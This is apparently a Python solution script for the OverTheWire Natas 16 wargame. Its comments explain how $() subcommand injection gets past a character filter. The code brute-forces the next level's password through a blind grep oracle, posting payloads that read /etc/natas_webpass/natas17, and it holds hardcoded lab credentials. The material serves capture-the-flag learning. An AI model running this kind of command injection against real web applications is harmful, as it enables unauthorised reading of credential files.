import requests as req
import re
import string as st

characters=st.ascii_letters+st.digits
print(characters)
"""
Here the challange is more likely command injection again .

Onece check for the source code .

This time it matches some more characters defined by : '/[;|&`\'"]/'

The grep command here is also expecting a regex pattern . But This time the key is enclosed in double quotes .

To Bypass this we can use A subcommand injection payload like : $(grep -E ...).

In this technique the subcommand is executed first and its output is placed in the main command .

"""
username="natas16"
password='hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'

url="http://%s.natas.labs.overthewire.org/" % username

seen_password=""

for i in range(33):
    for ch in characters:
        print(f"Currently cheaking with : {seen_password} + {ch}")
        payload=f"expl$(grep -E ^{seen_password}{ch}.* /etc/natas_webpass/natas17)"
        print(f"payload: {payload}")

        data={
            "needle":payload,
            "submit":"submit"
        }
        response=req.post(url,auth=(username,password),data=data)

        if "exploit" not in response.text:
            seen_password+=ch
            print(seen_password)
            break





